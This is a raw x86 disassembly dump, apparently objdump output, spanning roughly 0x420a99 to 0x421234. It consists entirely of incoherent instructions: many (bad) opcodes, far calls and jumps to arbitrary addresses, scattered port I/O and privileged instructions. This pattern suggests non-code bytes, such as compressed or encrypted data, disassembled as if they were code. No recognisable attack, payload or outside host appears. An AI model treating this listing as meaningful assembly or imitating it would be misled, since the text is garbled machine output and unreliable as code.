  420a99:	js     0x420ab4
  420a9b:	fadd   st(6),st
  420a9d:	sbb    al,0x69
  420a9f:	mov    al,0x3a
  420aa1:	push   ebp
  420aa2:	call   0x1318:0x58dc0078
  420aa9:	or     dh,BYTE PTR [eax]
  420aab:	dec    edi
  420aac:	cdq    
  420aad:	rcl    DWORD PTR [esi+0x30],0xb5
  420ab1:	push   0xc8f2bdb7
  420ab6:	scas   eax,DWORD PTR es:[edi]
  420ab7:	xor    dl,dh
  420ab9:	lods   eax,DWORD PTR ds:[esi]
  420aba:	je     0x420a48
  420abc:	fisttp QWORD PTR [edx+0x36817ae2]
  420ac2:	sbb    eax,0x69dd2b3a
  420ac7:	out    0xc0,eax
  420ac9:	femms  
  420acb:	add    eax,DWORD PTR [eax]
  420acd:	pop    ebx
  420ace:	scas   eax,DWORD PTR es:[edi]
  420acf:	retf   
  420ad0:	mov    ch,0x35
  420ad2:	inc    esp
  420ad3:	pop    ds
  420ad4:	or     DWORD PTR [esi-0x7e71ea4e],0x13a62817
  420ade:	cmp    eax,0x6031c6a8
  420ae3:	adc    ebx,edi
  420ae5:	imul   ebp,eax,0x2dd9bd26
  420aeb:	adc    al,cl
  420aed:	popf   
  420aee:	int3   
  420aef:	ror    BYTE PTR ds:0x1fb57d5d,0x9d
  420af6:	mov    bh,0x30
  420af8:	js     0x420b0c
  420afa:	mov    edx,0xe206c4ec
  420aff:	daa    
  420b00:	jmp    0x914cfb68
  420b05:	adc    al,0x1c
  420b07:	adc    ah,BYTE PTR [ecx+0x48ff4aaf]
  420b0d:	mov    dl,0x4d
  420b0f:	cmp    al,0x9
  420b11:	or     DWORD PTR [edx-0x23],esi
  420b14:	jmp    DWORD PTR [edi-0x11e65bbb]
  420b1a:	popa   
  420b1b:	push   0x8d183d29
  420b20:	mov    edi,0xedf4e1f
  420b25:	pop    ds
  420b26:	push   es
  420b27:	stos   DWORD PTR es:[edi],eax
  420b28:	and    ah,BYTE PTR [ebp-0xa]
  420b2b:	add    eax,0xa284d858
  420b30:	ds xor edx,esp
  420b33:	sbb    edx,DWORD PTR [ecx]
  420b35:	cmp    al,0x65
  420b37:	push   esi
  420b38:	xor    BYTE PTR [edx+0x1acd0b18],ch
  420b3e:	inc    edx
  420b3f:	jmp    0x48309dfc
  420b44:	int3   
  420b45:	mov    edx,DWORD PTR [esi]
  420b47:	push   eax
  420b48:	imul   esi,DWORD PTR [edi-0x1044f761],0xffffffd1
  420b4f:	pop    eax
  420b50:	pusha  
  420b51:	cwde   
  420b52:	loop   0x420bbe
  420b54:	leave  
  420b55:	pop    esi
  420b56:	mul    edi
  420b58:	mov    al,0x27
  420b5a:	test   al,0xd4
  420b5c:	rcl    dl,0xf8
  420b5f:	mov    DWORD PTR [ecx+0x2cefeace],ebx
  420b65:	es or  al,0xf
  420b68:	arpl   WORD PTR [edx],sp
  420b6a:	inc    edx
  420b6b:	adc    edx,ebp
  420b6d:	pop    ds
  420b6e:	dec    ebx
  420b6f:	cmp    DWORD PTR [edi],0x6025b2c8
  420b75:	and    cl,BYTE PTR ds:0xd8fe98f
  420b7b:	jl     0x420b68
  420b7d:	xchg   dx,ax
  420b7f:	in     ax,dx
  420b81:	cdq    
  420b82:	cmp    ebp,DWORD PTR [esi+0x5fe28416]
  420b88:	push   0x4d2add36
  420b8d:	sar    BYTE PTR [eax-0x713e5469],cl
  420b93:	idiv   DWORD PTR [ebx+0x21a78d16]
  420b99:	(bad)  
  420b9a:	sub    eax,0xe05d326c
  420b9f:	sub    ah,dh
  420ba1:	mov    ds:0xb378ceca,eax
  420ba6:	inc    ebx
  420ba7:	(bad)  
  420ba8:	sar    eax,cl
  420baa:	push   ebx
  420bab:	and    dl,BYTE PTR [esi-0x31faf340]
  420bb1:	ins    BYTE PTR es:[edi],dx
  420bb2:	or     cl,ah
  420bb4:	jne    0x420c32
  420bb6:	pop    esp
  420bb7:	xchg   edi,eax
  420bb8:	sub    BYTE PTR [edi],ch
  420bba:	xchg   edx,eax
  420bbb:	clc    
  420bbc:	or     eax,DWORD PTR [edx+ebx*2]
  420bbf:	adc    esp,DWORD PTR [eax-0x7313a2a4]
  420bc5:	xlat   BYTE PTR ds:[ebx]
  420bc6:	cmp    BYTE PTR [eax-0x19],ch
  420bc9:	xchg   cl,ah
  420bcb:	scas   eax,DWORD PTR es:[edi]
  420bcc:	mov    ?,WORD PTR [eax+0x2a]
  420bcf:	push   ecx
  420bd0:	ja     0x420c41
  420bd2:	xor    DWORD PTR [esi-0x7a154423],esi
  420bd8:	add    al,0x5e
  420bda:	fdiv   QWORD PTR [edx]
  420bdc:	loopne 0x420bf5
  420bde:	cmp    DWORD PTR [eax+0x5d],esp
  420be1:	xor    eax,0x408dfea3
  420be6:	js     0x420c0b
  420be8:	sub    al,0x46
  420bea:	jecxz  0x420b97
  420bec:	rol    BYTE PTR [eax],cl
  420bee:	dec    eax
  420bef:	pop    ecx
  420bf0:	xchg   esp,eax
  420bf1:	cwde   
  420bf2:	lods   eax,DWORD PTR ds:[esi]
  420bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bf4:	icebp  
  420bf5:	mov    al,0xb4
  420bf7:	icebp  
  420bf8:	int    0x78
  420bfa:	mov    esi,0xcb42fe96
  420bff:	or     bl,BYTE PTR [ecx+ebp*2-0x6e7264c2]
  420c06:	gs out 0xc8,al
  420c09:	fldcw  WORD PTR [eax-0x2268a045]
  420c0f:	sti    
  420c10:	scas   al,BYTE PTR es:[edi]
  420c11:	iret   
  420c12:	push   edx
  420c13:	arpl   WORD PTR [edi-0x54],bx
  420c16:	cmc    
  420c17:	sbb    DWORD PTR [ecx+ebx*8],0xb
  420c1b:	outs   dx,DWORD PTR ds:[esi]
  420c1c:	mov    ds:0x4dcced93,al
  420c21:	mov    bl,0x43
  420c23:	(bad)  
  420c24:	in     eax,dx
  420c25:	nop
  420c26:	cmp    al,0x18
  420c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c29:	mov    ecx,0x181d6d2
  420c2e:	jns    0x420c33
  420c30:	call   0x7d54ff15
  420c35:	(bad)  [ebx+ebx*1-0x2817fa0d]
  420c3c:	out    dx,eax
  420c3d:	jmp    0x4835:0x752bb462
  420c44:	enter  0x2fec,0xd7
  420c48:	xor    esi,DWORD PTR [ebx-0x66]
  420c4b:	mov    edi,DWORD PTR ds:0x8770ffd9
  420c51:	out    dx,eax
  420c52:	mov    dh,BYTE PTR [edx]
  420c54:	das    
  420c55:	xchg   ecx,eax
  420c56:	or     BYTE PTR [edx+0x58e7b892],cl
  420c5c:	clc    
  420c5d:	mov    DWORD PTR [ecx],ebp
  420c5f:	mov    eax,0x8239c6b6
  420c64:	jns    0x420cb8
  420c66:	jge    0x420c91
  420c68:	inc    edi
  420c69:	test   DWORD PTR [ecx-0x3ab1c801],0x7d0f85dd
  420c73:	mov    ds:0xa09e874e,al
  420c78:	push   cs
  420c79:	mov    ds:0xd99a67c8,al
  420c7e:	enter  0x2352,0x4a
  420c82:	and    al,0x21
  420c84:	adc    DWORD PTR [ebp+0x1af398f2],esi
  420c8a:	add    BYTE PTR [eax-0x792ed69a],0xfb
  420c91:	out    0xba,eax
  420c93:	add    DWORD PTR [eax+0x2e],0xffffffd6
  420c97:	cmp    DWORD PTR [edx],ebp
  420c99:	and    cl,BYTE PTR [ebx+0x2a4f9e5b]
  420c9f:	mov    edx,0x5a017c44
  420ca4:	mov    eax,0x84a309b8
  420ca9:	push   ebx
  420caa:	xchg   ecx,eax
  420cab:	inc    ebp
  420cac:	inc    ecx
  420cad:	push   ss
  420cae:	add    dh,dl
  420cb0:	pop    edx
  420cb1:	lahf   
  420cb2:	(bad)  
  420cb3:	aaa    
  420cb4:	(bad)  
  420cb5:	cwde   
  420cb6:	sub    eax,DWORD PTR [esi+edi*4-0x22]
  420cba:	das    
  420cbb:	mov    ds:0x9b70cdf1,eax
  420cc0:	add    al,0x5b
  420cc2:	in     eax,dx
  420cc3:	mov    BYTE PTR cs:[ebp+0x17],bl
  420cc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc8:	add    BYTE PTR [esi-0x4],bl
  420ccb:	jb     0x420c68
  420ccd:	repnz push edx
  420ccf:	adc    BYTE PTR [edi],0xf
  420cd2:	push   ecx
  420cd3:	sub    eax,0x55813b2b
  420cd8:	jle    0x420ccd
  420cda:	in     al,dx
  420cdb:	imul   bl
  420cdd:	and    eax,0x56ca97f6
  420ce2:	cmp    BYTE PTR [ecx-0x30],ah
  420ce5:	push   edx
  420ce6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ce7:	aaa    
  420ce8:	outs   dx,DWORD PTR ds:[esi]
  420ce9:	imul   esp,ecx,0xffffffbb
  420cec:	fadd   QWORD PTR [edx+0x154563cb]
  420cf2:	inc    esi
  420cf3:	adc    al,dl
  420cf5:	out    0x17,al
  420cf7:	fld    QWORD PTR [ebp-0x230b35b7]
  420cfd:	mov    ebp,edx
  420cff:	cdq    
  420d00:	addr16 (bad) 
  420d02:	in     al,0x27
  420d04:	or     eax,0x96b729c6
  420d09:	dec    ecx
  420d0a:	aad    0xc4
  420d0c:	icebp  
  420d0d:	jne    0x420c91
  420d0f:	cli    
  420d10:	xor    esi,DWORD PTR [ecx-0x7d092fa8]
  420d16:	cli    
  420d17:	inc    eax
  420d18:	test   al,0xf0
  420d1a:	mov    al,0xb0
  420d1c:	(bad)  
  420d1d:	xchg   edi,eax
  420d1e:	mov    cs:0x16c376b5,al
  420d24:	jge    0x420cae
  420d26:	mov    bh,0xd4
  420d28:	inc    eax
  420d29:	inc    eax
  420d2a:	jmp    0x420d72
  420d2c:	out    dx,al
  420d2d:	adc    al,0xa7
  420d2f:	scas   al,BYTE PTR es:[edi]
  420d30:	repnz and esp,DWORD PTR [edx]
  420d33:	and    edx,DWORD PTR [edi]
  420d35:	int3   
  420d36:	adc    ebx,DWORD PTR [edi-0x5c]
  420d39:	push   es
  420d3a:	xlat   BYTE PTR ds:[ebx]
  420d3b:	adc    eax,0xdfc86a37
  420d40:	mov    DWORD PTR [esi-0x4a],0xc1a9ccad
  420d47:	call   0x3c2f5df7
  420d4c:	out    0xe7,al
  420d4e:	sbb    eax,0xa0c290e6
  420d53:	fdivr  DWORD PTR [ecx-0x66]
  420d56:	push   0xe1c0b21e
  420d5b:	cld    
  420d5c:	retf   
  420d5d:	bound  ebx,QWORD PTR [eax-0xd]
  420d60:	jmp    0xf301f9b7
  420d65:	(bad)  
  420d66:	mov    eax,ds:0x3e79d2f
  420d6b:	push   ebx
  420d6c:	jae    0x420d9e
  420d6e:	add    eax,0xc329ac27
  420d73:	jle    0x420cfc
  420d75:	nop
  420d76:	lock cmp DWORD PTR [esi+edx*8],esp
  420d7a:	test   eax,0x8b61148b
  420d7f:	xchg   BYTE PTR [eax-0x39d10346],ch
  420d85:	adc    eax,edi
  420d87:	mov    eax,0x1be748a5
  420d8c:	test   al,0xef
  420d8e:	add    DWORD PTR ds:0x163081de,ebp
  420d94:	push   ebx
  420d95:	push   esi
  420d96:	mov    ebx,0xe9c900b0
  420d9b:	xchg   esp,eax
  420d9c:	jg     0x420db9
  420d9e:	shr    BYTE PTR [ebx],0x41
  420da1:	xlat   BYTE PTR ds:[ebx]
  420da2:	das    
  420da3:	lods   eax,DWORD PTR ds:[esi]
  420da4:	and    DWORD PTR [ebx-0x18249e0],edi
  420daa:	jnp    0x420d97
  420dac:	jb     0x420d8d
  420dae:	fstp   TBYTE PTR [edx+0x37]
  420db1:	mov    eax,0xa7ab23f
  420db6:	fcmovnb st,st(1)
  420db8:	add    esp,edi
  420dba:	lods   eax,DWORD PTR ds:[esi]
  420dbb:	loop   0x420d5a
  420dbd:	jmp    0x3280:0xc35c863f
  420dc4:	fdiv   QWORD PTR [ecx]
  420dc6:	push   eax
  420dc7:	repnz sbb eax,0x5cdf1b59
  420dcd:	and    BYTE PTR [ebp-0x1a],al
  420dd0:	outs   dx,BYTE PTR ds:[esi]
  420dd1:	inc    eax
  420dd2:	jg     0x420de5
  420dd4:	cmp    DWORD PTR [esi+eiz*1],ebx
  420dd7:	adc    DWORD PTR [esi+0x49],ebp
  420dda:	cld    
  420ddb:	and    dh,al
  420ddd:	test   BYTE PTR [ebp+0x1a],dh
  420de0:	lahf   
  420de1:	aam    0x4f
  420de3:	inc    edi
  420de4:	pop    ebp
  420de5:	inc    ebp
  420de6:	repz inc bx
  420de9:	outs   dx,DWORD PTR ds:[esi]
  420dea:	pop    ebp
  420deb:	cmp    ch,BYTE PTR [edx+eiz*1]
  420dee:	rcl    DWORD PTR [esi],0xcb
  420df1:	ins    BYTE PTR es:[edi],dx
  420df2:	sub    DWORD PTR ds:0xafa5730a,0xffffffb5
  420df9:	cwde   
  420dfa:	pop    ecx
  420dfb:	jge    0x420da5
  420dfd:	lods   al,BYTE PTR ds:[esi]
  420dfe:	dec    edx
  420dff:	xchg   edx,eax
  420e00:	inc    ebx
  420e01:	lods   al,BYTE PTR ds:[esi]
  420e02:	cmp    esi,DWORD PTR [edx-0x37]
  420e05:	push   cs
  420e06:	push   ds
  420e07:	sbb    eax,0x766faced
  420e0c:	mov    ebx,0x4414161
  420e11:	out    dx,eax
  420e12:	jnp    0x420dc3
  420e14:	sbb    bl,dl
  420e16:	popf   
  420e17:	sar    BYTE PTR [ebx+eiz*8+0xc3067c0],0xb7
  420e1f:	or     DWORD PTR [edx+0xa],ebp
  420e22:	sub    DWORD PTR [ebx],ecx
  420e24:	fdivp  st(1),st
  420e26:	xchg   esp,eax
  420e27:	adc    bl,cl
  420e29:	loopne 0x420e10
  420e2b:	aam    0xd3
  420e2d:	adc    DWORD PTR [esi-0x3d931a3d],esi
  420e33:	rcl    DWORD PTR [edi],1
  420e35:	rol    BYTE PTR [ecx+edx*8],cl
  420e38:	xor    eax,0x5e005b37
  420e3d:	outs   dx,BYTE PTR ds:[esi]
  420e3e:	test   BYTE PTR [esi-0x3cd942ec],al
  420e44:	jge    0x420dd0
  420e46:	lock push ebp
  420e48:	jnp    0x420e67
  420e4a:	mov    ebx,0xceb53da7
  420e4f:	cli    
  420e50:	rol    BYTE PTR [ebx+0x71],cl
  420e53:	fmul   DWORD PTR [esi+0x26]
  420e56:	push   edi
  420e57:	sub    ebx,edx
  420e59:	push   ds
  420e5a:	pop    eax
  420e5b:	jle    0x420e4b
  420e5d:	iret   
  420e5e:	mul    DWORD PTR [edi-0x19]
  420e61:	jp     0x420ee2
  420e63:	sti    
  420e64:	mov    cs,WORD PTR [edx+0x4a4f930a]
  420e6a:	xchg   edx,eax
  420e6b:	fidivr WORD PTR [ebx-0x27d62d92]
  420e71:	mov    ah,0x34
  420e73:	loopne 0x420e62
  420e75:	xchg   ecx,eax
  420e76:	cdq    
  420e77:	in     al,dx
  420e78:	fucomp st(1)
  420e7a:	es in  al,0xea
  420e7d:	cdq    
  420e7e:	aam    0x95
  420e80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e81:	aam    0x9f
  420e83:	xor    BYTE PTR [eax],bh
  420e85:	add    al,BYTE PTR [ebx]
  420e87:	or     al,0xa5
  420e89:	mov    ah,0x1
  420e8b:	xor    DWORD PTR [edi-0x57],eax
  420e8e:	je     0x420e66
  420e90:	mov    ah,0xe5
  420e92:	push   edi
  420e93:	inc    eax
  420e94:	jge    0x420e59
  420e96:	rol    BYTE PTR [ecx+0x305e5a8c],cl
  420e9c:	stc    
  420e9d:	cmp    al,0x1b
  420e9f:	fsub   QWORD PTR [edx+0x4bfbc98c]
  420ea6:	sbb    al,0xb1
  420ea8:	or     eax,0x9f5c2e23
  420ead:	cmc    
  420eae:	loop   0x420ec1
  420eb0:	or     DWORD PTR [edx],edi
  420eb2:	pop    esi
  420eb3:	scas   eax,DWORD PTR es:[edi]
  420eb4:	xchg   ebx,eax
  420eb5:	rcr    bh,cl
  420eb7:	xor    eax,0x830db966
  420ebc:	push   ecx
  420ebd:	dec    ecx
  420ebe:	or     BYTE PTR [eax+ebx*8],0xf
  420ec2:	in     eax,dx
  420ec3:	push   ecx
  420ec4:	inc    esp
  420ec5:	cmp    bh,bl
  420ec7:	mov    edi,0xcb0185ba
  420ecc:	xchg   esp,eax
  420ecd:	and    bl,BYTE PTR [ebx+0x6b37bb8f]
  420ed3:	jo     0x420ec3
  420ed5:	leave  
  420ed6:	lahf   
  420ed7:	jle    0x420f0d
  420ed9:	and    al,0xf0
  420edb:	bound  edi,QWORD PTR [edi+ecx*4]
  420ede:	add    ah,BYTE PTR ds:0x78a44ff0
  420ee4:	cmp    ebx,DWORD PTR [edx+0x7c]
  420ee7:	inc    ebp
  420ee8:	xor    ch,bl
  420eea:	or     ebp,eax
  420eec:	mov    edi,0xeae43f06
  420ef1:	mov    al,0xc5
  420ef3:	shl    BYTE PTR [ebp+0x635b4b7e],0x10
  420efa:	aas    
  420efb:	or     BYTE PTR [edx-0x3b],dh
  420efe:	rcr    BYTE PTR [eax+0x4d],cl
  420f01:	retf   
  420f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f03:	out    0x38,eax
  420f05:	push   ebx
  420f06:	pop    ds
  420f07:	mov    eax,0xb01ef2d4
  420f0c:	clc    
  420f0d:	test   al,0x69
  420f0f:	or     DWORD PTR [edx+0x1c],0x790458c2
  420f16:	xor    esi,DWORD PTR [esi+0x5b616753]
  420f1c:	and    dh,BYTE PTR [edi+0x46]
  420f1f:	sub    BYTE PTR [ebx],dl
  420f21:	(bad)  
  420f23:	lahf   
  420f24:	rcr    DWORD PTR [esi-0x4f991c5c],0x1b
  420f2b:	pusha  
  420f2c:	lea    ebx,[ebx+0x0]
  420f2f:	mov    esp,0x6060f4f9
  420f34:	sub    eax,0xa8f8f18a
  420f39:	hlt    
  420f3a:	mov    ecx,gs
  420f3c:	ins    BYTE PTR es:[edi],dx
  420f3d:	push   ebp
  420f3e:	cmc    
  420f3f:	mov    al,ds:0xe44a7e90
  420f44:	loop   0x420fa0
  420f46:	jecxz  0x420f3e
  420f48:	cdq    
  420f49:	jl     0x420f30
  420f4b:	call   0xcb1d:0xbb9f2d31
  420f52:	jg     0x420f9e
  420f54:	mov    ebx,0x56dfb5e8
  420f59:	adc    bl,dh
  420f5b:	push   ebp
  420f5c:	rcl    BYTE PTR [edi+ebp*4],1
  420f5f:	das    
  420f60:	popf   
  420f61:	push   edx
  420f62:	lock bnd js 0x420f1f
  420f66:	cmp    eax,0xfbf501cf
  420f6b:	push   0xffffff99
  420f6d:	psrad  mm2,0x6a
  420f71:	push   0xffffffa1
  420f73:	outs   dx,BYTE PTR ds:[esi]
  420f74:	stos   BYTE PTR es:[edi],al
  420f75:	clc    
  420f76:	in     eax,0x6b
  420f78:	call   0x66e:0x60c5ecbf
  420f7f:	repz and eax,0xa6f6f550
  420f85:	retf   0xd989
  420f88:	sub    al,0x44
  420f8a:	jno    0x420fe6
  420f8c:	cmc    
  420f8d:	xchg   bl,ah
  420f8f:	and    DWORD PTR [edx-0x61653c78],ebp
  420f95:	lock mov gs,WORD PTR [ebp-0x2ab61917]
  420f9c:	inc    DWORD PTR [ebx-0x38]
  420f9f:	jb     0x420f48
  420fa1:	inc    edi
  420fa2:	bound  eax,QWORD PTR [ebx*8-0x5fc40b9]
  420fa9:	cmp    DWORD PTR [ebx+0x51c1f7f5],ecx
  420faf:	jp     0x420f52
  420fb1:	mov    ch,0xea
  420fb3:	dec    edi
  420fb4:	test   al,0x41
  420fb6:	add    esi,eax
  420fb8:	xor    eax,0x3eb7b854
  420fbd:	int3   
  420fbe:	jmp    0xf92871c6
  420fc3:	rol    BYTE PTR [ecx-0x17961ea5],cl
  420fc9:	fst    DWORD PTR [eax-0x61]
  420fcc:	fwait
  420fcd:	neg    BYTE PTR [edi+ecx*4+0x55]
  420fd1:	mov    ebp,0x12e7da96
  420fd6:	nop
  420fd7:	xor    eax,0xaf591a04
  420fdc:	inc    eax
  420fdd:	fistp  DWORD PTR [ecx+ecx*2+0x3801ba4f]
  420fe4:	jno    0x42104b
  420fe6:	sar    BYTE PTR [ecx],1
  420fe8:	jle    0x420fdf
  420fea:	addr16 mov al,0xa7
  420fed:	aam    0x23
  420fef:	imul   edx
  420ff1:	ds (bad) 
  420ff3:	cmp    al,0xde
  420ff5:	xchg   ebx,eax
  420ff6:	clc    
  420ff7:	inc    ecx
  420ff8:	call   0x465d:0x90056aad
  420fff:	xacquire xchg BYTE PTR [ebp-0x2a],ch
  421003:	nop
  421004:	sti    
  421005:	loope  0x421056
  421007:	pop    edx
  421008:	inc    ebx
  421009:	clc    
  42100a:	inc    ebp
  42100b:	add    al,0xd3
  42100d:	nop
  42100e:	ins    BYTE PTR es:[edi],dx
  42100f:	adc    eax,0xb92f6896
  421014:	loop   0x420faa
  421016:	push   esi
  421017:	cmp    DWORD PTR [edx],esp
  421019:	mov    eax,ds:0x26f48f51
  42101e:	arpl   dx,cx
  421020:	(bad)  [eax+0x53bc547a]
  421026:	ja     0x42107e
  421028:	pop    es
  421029:	aas    
  42102a:	lods   al,BYTE PTR ds:[esi]
  42102b:	ror    DWORD PTR [esi-0x3e],cl
  42102e:	or     eax,0xfa933c62
  421033:	jne    0x420ffc
  421035:	aaa    
  421036:	stos   DWORD PTR es:[edi],eax
  421037:	or     al,0x4e
  421039:	mov    esp,0xd411535
  42103e:	mov    ecx,0x89cf8ce
  421043:	mov    edx,0xcc547794
  421048:	xor    DWORD PTR [ecx+0xb2b9c7a],esp
  42104e:	outs   dx,BYTE PTR ds:[esi]
  42104f:	pushf  
  421050:	sbb    al,al
  421052:	sub    bl,BYTE PTR [edi]
  421054:	aas    
  421055:	mov    ds:0x86ceeea4,eax
  42105a:	add    bh,cl
  42105c:	std    
  42105d:	(bad)  
  42105e:	int3   
  42105f:	xchg   edx,eax
  421060:	movaps xmm1,xmm5
  421063:	into   
  421064:	lds    ebp,FWORD PTR [edi]
  421066:	daa    
  421067:	imul   ebx,ebp,0xfffffff8
  42106a:	adc    ebp,esi
  42106c:	inc    edi
  42106d:	in     eax,0x8c
  42106f:	cdq    
  421070:	rcr    ecx,0x3b
  421073:	dec    edx
  421074:	xor    eax,0xd3ed0b43
  421079:	(bad)  
  42107a:	ror    BYTE PTR [ebx+0x30],cl
  42107d:	cmp    BYTE PTR [edi+0x72],al
  421080:	mov    al,ds:0x1d7cf893
  421085:	std    
  421086:	mov    fs,WORD PTR [ebp-0x2b39d70f]
  42108c:	cmp    al,0xb1
  42108e:	dec    ebp
  42108f:	cmp    al,0x76
  421091:	loop   0x42110b
  421093:	and    DWORD PTR [esi-0x19],0x1e
  421097:	pop    ecx
  421098:	jg     0x42103c
  42109a:	pop    es
  42109b:	loopne 0x42110c
  42109d:	icebp  
  42109e:	icebp  
  42109f:	arpl   di,bp
  4210a1:	add    al,0xd0
  4210a3:	dec    edi
  4210a4:	inc    ebx
  4210a5:	jle    0x4210d4
  4210a7:	fcmovb st,st(4)
  4210a9:	dec    ebx
  4210aa:	daa    
  4210ab:	dec    eax
  4210ac:	jmp    0x6b8d08eb
  4210b1:	and    eax,0xd72d2dac
  4210b6:	pop    ds
  4210b7:	and    eax,0x2acdd8ef
  4210bc:	call   0x6c2afde3
  4210c1:	inc    ebx
  4210c2:	ja     0x421108
  4210c4:	sub    al,0xc4
  4210c6:	pop    edx
  4210c7:	cmp    DWORD PTR [esi+ebp*4],edi
  4210ca:	outs   dx,DWORD PTR ds:[esi]
  4210cb:	les    ebx,FWORD PTR [ebx]
  4210cd:	mov    al,0xde
  4210cf:	scas   al,BYTE PTR es:[edi]
  4210d0:	enter  0xa2c1,0xdb
  4210d4:	cli    
  4210d5:	adc    esp,esp
  4210d7:	in     al,0x2c
  4210d9:	aaa    
  4210da:	mov    ebp,0x4a6789c7
  4210df:	adc    BYTE PTR [esp+eax*8],dh
  4210e2:	outs   dx,DWORD PTR ds:[esi]
  4210e3:	dec    edi
  4210e4:	inc    ebx
  4210e5:	out    dx,al
  4210e6:	mov    BYTE PTR ds:0xdb35adf4,cl
  4210ec:	or     ebp,DWORD PTR [ebp+0x15]
  4210ef:	pop    esi
  4210f0:	gs ds jl 0x421158
  4210f4:	int3   
  4210f5:	fwait
  4210f6:	(bad)  
  4210f7:	scas   eax,DWORD PTR es:[edi]
  4210f8:	pusha  
  4210f9:	cmp    ebx,esi
  4210fb:	repz push edi
  4210fd:	cmp    BYTE PTR [esi-0x520edbbd],dl
  421103:	push   ebx
  421104:	inc    esp
  421105:	out    dx,eax
  421106:	add    al,0xbf
  421108:	jbe    0x421189
  42110a:	adc    bl,BYTE PTR [esp+edx*4]
  42110d:	retf   0xafa0
  421110:	pop    ss
  421111:	jl     0x421122
  421113:	inc    eax
  421114:	shr    DWORD PTR [ebp-0x6ebad21],1
  42111a:	lods   al,BYTE PTR ds:[esi]
  42111b:	dec    ebp
  42111c:	lods   eax,DWORD PTR ds:[esi]
  42111d:	xchg   ebx,eax
  42111e:	mov    bl,0x85
  421120:	pop    ds
  421121:	jb     0x421194
  421123:	out    0x97,al
  421125:	mov    cl,0x30
  421127:	xchg   BYTE PTR [ecx-0x45fd0dda],ch
  42112d:	pop    edi
  42112e:	cmc    
  42112f:	adc    cl,BYTE PTR [ecx-0x22]
  421132:	cwde   
  421133:	mov    ch,0x8
  421135:	and    DWORD PTR [eax+0xe2e79d3],ebx
  42113b:	jb     0x4210cd
  42113d:	sbb    DWORD PTR [ebp+eiz*1+0x64],edi
  421141:	fsub   QWORD PTR [edi]
  421143:	adc    eax,DWORD PTR [edx+0x51f74f1b]
  421149:	aam    0xb6
  42114b:	sar    BYTE PTR ds:0x706d10cb,cl
  421151:	stos   DWORD PTR es:[edi],eax
  421152:	xchg   BYTE PTR [esi],dl
  421154:	mov    ebx,0x854b8010
  421159:	push   cs
  42115a:	fdiv   QWORD PTR [esi+0x3e1696c9]
  421160:	pop    edi
  421161:	sbb    dl,BYTE PTR [edx]
  421163:	sbb    ebp,ecx
  421165:	lock push edx
  421167:	xchg   edx,eax
  421168:	push   0xffffffd1
  42116a:	jae    0x421117
  42116c:	daa    
  42116d:	lods   al,BYTE PTR ds:[esi]
  42116e:	sub    al,0x98
  421170:	push   ds
  421171:	stos   DWORD PTR es:[edi],eax
  421172:	sbb    al,0xf4
  421174:	cs xchg ebx,eax
  421176:	pop    ss
  421177:	out    dx,eax
  421178:	pop    ecx
  421179:	(bad)  
  42117b:	loopne 0x4211f0
  42117d:	pop    edi
  42117e:	sub    al,0xfa
  421180:	jmp    0x754b4deb
  421185:	mov    eax,DWORD PTR [esi+ebp*8]
  421188:	sbb    DWORD PTR [eax+edx*8+0x2],ebp
  42118c:	loopne 0x421207
  42118e:	adc    eax,0x2d41431d
  421193:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421194:	jmp    FWORD PTR [eax+0x63d17e3b]
  42119a:	(bad)  
  42119b:	and    bh,BYTE PTR [ebx-0x5c]
  42119e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42119f:	fcomp  st(0)
  4211a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211a2:	popa   
  4211a3:	jne    0x4211ab
  4211a5:	daa    
  4211a6:	popa   
  4211a7:	adc    dl,BYTE PTR [edi]
  4211a9:	cmc    
  4211aa:	and    BYTE PTR [esi+esi*1+0x73],cl
  4211ae:	jb     0x421156
  4211b0:	mov    edi,esi
  4211b2:	test   DWORD PTR [edx],0xf69c487f
  4211b8:	push   edi
  4211b9:	or     eax,DWORD PTR [ebx]
  4211bb:	leave  
  4211bc:	pop    es
  4211bd:	test   eax,0xb5bee52a
  4211c2:	jg     0x421165
  4211c4:	mov    ah,0x1d
  4211c6:	mov    al,0xaf
  4211c8:	ret    0xf560
  4211cb:	pop    es
  4211cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211cd:	or     edx,DWORD PTR [ecx-0x46]
  4211d0:	lods   eax,DWORD PTR ds:[esi]
  4211d1:	jae    0x4211a0
  4211d3:	pusha  
  4211d4:	xchg   ecx,eax
  4211d5:	push   edi
  4211d6:	cmp    bh,dl
  4211d8:	(bad)  
  4211d9:	sahf   
  4211da:	inc    ecx
  4211db:	inc    esi
  4211dc:	sub    BYTE PTR [esi+0x16c67d1f],al
  4211e2:	jecxz  0x4211e8
  4211e4:	push   ebx
  4211e5:	idiv   ebp
  4211e7:	jbe    0x42118e
  4211e9:	sub    DWORD PTR [ebx],edx
  4211eb:	xchg   esp,eax
  4211ec:	xchg   esp,eax
  4211ed:	add    al,0xb3
  4211ef:	into   
  4211f0:	repnz cmc 
  4211f2:	dec    esi
  4211f3:	gs (bad) 
  4211f5:	adc    al,0xc
  4211f7:	cwde   
  4211f8:	adc    eax,0x99396fef
  4211fd:	jecxz  0x421211
  4211ff:	icebp  
  421200:	(bad)  [ebx]
  421202:	lods   eax,DWORD PTR ds:[esi]
  421203:	pop    eax
  421204:	adc    al,0x75
  421206:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421207:	repz inc eax
  421209:	mov    dh,0x2b
  42120b:	scas   al,BYTE PTR es:[edi]
  42120c:	in     al,dx
  42120d:	mov    esi,0x98f24dff
  421212:	xor    DWORD PTR [eax-0x1a],ebx
  421215:	scas   al,BYTE PTR es:[edi]
  421216:	mov    ecx,0xa37395f4
  42121b:	aam    0x63
  42121d:	cld    
  42121e:	mov    esp,?
  421220:	bound  esi,QWORD PTR [edx-0x4badc55e]
  421226:	xchg   DWORD PTR [edi-0x62855837],esi
  42122c:	ins    DWORD PTR es:[edi],dx
  42122d:	dec    esp
  42122e:	or     BYTE PTR [eax-0x4f],bh
  421231:	mov    bl,0x56
  421233:	out    dx,eax
  421234:	iret   
